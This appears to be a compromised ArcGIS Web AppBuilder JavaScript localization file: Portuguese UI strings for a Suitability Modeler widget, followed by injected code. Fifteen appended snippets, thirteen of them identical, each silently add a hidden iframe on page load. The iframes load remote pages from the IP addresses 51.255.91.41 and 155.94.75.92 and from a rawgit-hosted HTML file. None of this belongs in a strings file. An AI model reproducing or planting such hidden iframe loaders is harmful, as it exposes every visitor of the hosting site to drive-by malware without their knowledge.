// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.

define({"widgets/SuitabilityModeler/nls/strings":{_widgetLabel:"Modelador de Adequa\u00e7\u00e3o",general:{clear:"Limpar",cancel:"Cancelar",save:"Executar",saveAs:"Exportar"},saveModel:{save:"Exportar",title:"T\u00edtulo: ",summary:"Resumo: ",description:"Descri\u00e7\u00e3o: ",tags:"Palavras-chave: ",folder:"Pasta: ",homeFolderPattern:"{username} (Home)",failed:"Exportar falhou."},util:{colorRamp:{1:"Extremamente Baixo",2:"Muito Baixo",3:"Baixo",4:"M\u00e9dio-Baixo",5:"M\u00e9dia",6:"M\u00e9dio-Alto",
7:"Alto",8:"Muito Alto",9:"Extremamente Alto",low:"Baixo",high:"Alto",tipPattern:"{label} ({value})",flipCaption:"Inverter"}},wro:{caption:"Modelador de Adequa\u00e7\u00e3o",browsePrompt:"Servi\u00e7o de Sobreposi\u00e7\u00e3o Ponderada",selectLayersCaption:"Selecionar Camadas",selectLayers:"Camadas",designModelCaption:"Modelo de Design",designModel:"Modelo de Design",transparency:"Transpar\u00eancia",visible:"Vis\u00edvel",total:"Total",unableToLoad:"N\u00e3o foi poss\u00edvel carregar o modelo.",
projectNotOpen:"N\u00e3o se encontra aberto qualquer projeto.",readMore:"Ler Mais",validation:{validating:"A validar...",invalidItemCaption:"Aviso de Servi\u00e7o de Sobreposi\u00e7\u00e3o Ponderada",notAnImageService:"Este item n\u00e3o \u00e9 um Servi\u00e7o de Imagem",notAWroService:"Este item n\u00e3o \u00e9 um Servi\u00e7o de Sobreposi\u00e7\u00e3o Ponderada",undefinedUrl:"O URL deste item n\u00e3o est\u00e1 definido.",inaccessible:"O servi\u00e7o encontra-se inacess\u00edvel.",generalError:"Imposs\u00edvel abrir o item.",
missingFieldPattern:"{field} \u00e9 um campo obrigat\u00f3rio",notAllowRasterFunction:"allowRasterFunction tem de ser definido como verdadeiro",notNearestResampling:"defaultResamplingMethod tem de ser O Mais Pr\u00f3ximo",notIsWeightedOverlayProp:"A propriedade-chave IsWeightedOverlay tem de ser definida como verdadeira",invalidLink:"O URL \u00e9 inv\u00e1lido. Ocorreu uma falha ao abrir o site para a camada selecionada.",unexpectedError:"Ocorreu um estado inesperado.",rangeMessage:"O valor tem de encontrar-se entre ${0} e ${1}.",
rangeMessage100:"O valor tem de encontrar-se entre 0 e 100.",maxLayers:"M\u00e1ximo de ${0} camadas permitidas por servi\u00e7o, primeiro tem de remover uma camada antes de adicionar uma nova.",notFound:"Camada ${0} n\u00e3o encontrada no servi\u00e7o de sobreposi\u00e7\u00e3o ponderada",wroServiceNotDefined:"N\u00e3o se encontra definido qualquer servi\u00e7o de sobreposi\u00e7\u00e3o ponderada para o modelo.",overlayLayerOutputInvalid:"Camada de sobreposi\u00e7\u00e3o [${0}] voltar a cartografar intervalos [${1}] valor de sa\u00edda em falta ou inv\u00e1lido",
overlayLayerInputInvalid:"Camada de sobreposi\u00e7\u00e3o [${0}] voltar a cartografar intervalos [${1}] m\u00e1x/min de sa\u00edda em falta ou inv\u00e1lido",overlayLayerRangesMissing:"Camada de sobreposi\u00e7\u00e3o [${0}] intervalos para nova cartografia em falta",overlayLayerWeight:"As pondera\u00e7\u00f5es da camada de sobreposi\u00e7\u00e3o t\u00eam de  perfazer 100",overlayLayerRequired:"\u00c9 necess\u00e1ria pelo menos uma camada de sobreposi\u00e7\u00e3o",overlayLayerNotDefined:"As camadas de sobreposi\u00e7\u00e3o n\u00e3o est\u00e3o definidas",
requiresColormap:"Esta fun\u00e7\u00e3o de raster requer um mapa de cores (colormap), mas o modelo n\u00e3o tem uma defini\u00e7\u00e3o de mapa de cores (colormap) definida",createModelError:"Erro ao Criar Modelo",invalidModel:"O modelo n\u00e3o \u00e9 v\u00e1lido",imageServiceNotDefined:"A camada de servi\u00e7o de imagem n\u00e3o est\u00e1 definida",imageLayerNotDefined:"A camada de servi\u00e7o de imagem n\u00e3o est\u00e1 definida",histogramNotDefined:"N\u00e3o est\u00e1 definida qualquer fun\u00e7\u00e3o de histograma de sobreposi\u00e7\u00e3o ponderada."},
colorRampLabel:{"Green Yellow Red":"Verde Amarelo Vermelho","Red Yellow Green":"Vermelho Amarelo Verde","Yellow to Dark Red":"De Amarelo a Vermelho Escuro","Dark Red to Yellow":"De Vermelho Escuro a Amarelo","Light Gray to Dark Gray":"De Cinza Claro a Cinza Escuro","Dark Gray to Light Gray":"De Cinza Escuro a Cinza Claro","Light Brown to Dark Brown":"De Castanho Claro a Castanho Escuro","Dark Brown to Light Brown":"De Castanho Escuro a Castanho Claro","Full Spectrum - Bright Red to Blue":"Gama Completa - de Vermelho Vivo a Azul",
"Full Spectrum - Bright Blue to Red":"Gama Completa - de Azul Vivo a Vermelho","Partial Spectrum - Yellow to Blue":"Gama Parcial - de Amarelo a Azul","Partial Spectrum - Blue to Yellow":"Gama Parcial - de Azul a Amarelo","Yellow-Green to Dark Blue":"De Amarelo-Verde a Azul Escuro","Dark Blue to Yellow-Green":"De Azul Escuro a Amarelo-Verde","Cold to Hot Diverging":"A Divergir entre Frio e Quente","Hot to Cold Diverging":"A Divergir entre Quente e Frio","Surface - Low to High":"Superf\u00edcie - de Baixo a Alto",
"Surface - High to Low":"Superf\u00edcie - de Alto a Baixo"}},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});